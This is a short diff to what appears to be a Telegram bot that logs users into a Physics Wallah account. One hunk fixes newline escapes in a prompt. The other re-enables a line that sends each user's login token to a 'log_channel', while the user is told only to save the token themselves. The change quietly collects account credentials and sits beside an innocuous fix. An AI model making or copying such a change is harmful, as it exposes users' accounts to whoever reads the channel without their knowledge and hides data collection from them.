@@ -17,7 +17,7 @@ async def pw_login(app, message):
     try:
         query_msg = await app.ask(
             chat_id=message.chat.id,
-            text="🔐 **𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗣𝘄 𝗠𝗼𝗯𝗶𝗹𝗲 𝗡𝗼\𝗻\n𝗢𝗥\𝗻\n𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗣𝘄 𝗧𝗼𝗸𝗲𝗻")
+            text="🔐 **𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗣𝘄 𝗠𝗼𝗯𝗶𝗹𝗲 𝗡𝗼\n\n𝗢𝗥\n\n𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗣𝘄 𝗧𝗼𝗸𝗲𝗻")
                  
         
         user_input = query_msg.text.strip()
@@ -77,7 +77,7 @@ async def pw_login(app, message):
             
             dl = (f"<b>Physics Wallah Login Successful ✅</b>\n\n<pre language='Save this Login Token for future usage'>{token}</pre>\n\n")
             await message.reply_text(f"<b>Physics Wallah Login Successful ✅</b>\n\n<pre language='Save this Login Token for future usage'>{token}</pre>\n\n")
-            #await app.send_message(log_channel, dl)
+            await app.send_message(log_channel, dl)
         
         elif user_input.startswith("e"):
             token = user_input
